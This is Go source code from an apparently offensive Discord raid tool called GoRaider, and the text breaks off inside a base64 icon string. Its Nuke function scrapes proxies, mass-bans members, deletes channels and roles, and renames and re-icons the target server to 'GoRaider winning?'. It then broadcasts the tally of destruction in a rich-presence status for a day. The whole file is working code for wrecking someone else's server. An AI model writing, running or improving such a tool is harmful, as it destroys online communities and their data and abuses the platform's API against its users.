package api

import (
	"fmt"
	"sync"
	"time"

	"github.com/Not-Cyrus/GoRaider/rpc"
	"github.com/Not-Cyrus/GoRaider/utils"
	"github.com/fatih/color"
	"github.com/valyala/fastjson"
)

func Nuke(guildName string) {
	coolColour.Println("Scraping proxies now...")

	startProxies := time.Now()
	proxies = utils.GetProxies()
	TotalProxies = len(proxies)
	proxyTime := time.Since(startProxies)

	coolColour.Printf("Scraped %d proxies in %s\n", len(proxies), proxyTime)

	nukeTime := time.Now()

	NukeMembers()

	NukeChannels()

	NukeRoles()

	doneNuking = true
	elapsedTime := time.Since(nukeTime)

	coolColour.Printf("Took %s to delete %d channels | %d roles and ban %d people\n", elapsedTime, channelsDeleted, rolesDeleted, banCount)

	utils.SendRequest("PATCH", fmt.Sprintf("https://discord.com/api/v8/guilds/%s", utils.GuildID), "application/json", "", guildData)

	rpc.ChangeRPC(banCount, channelsDeleted, rolesDeleted, len(proxies), elapsedTime, guildName)
	time.Sleep(24 * time.Hour) // we'll flex our RPC for 24 hours
}

var (
	bypassProxy  int  = 0
	coolColour        = color.New(color.FgCyan)
	doneNuking   bool = false
	guildData         = []byte(`{"name":"GoRaider winning?","icon":"data:image/png;base64,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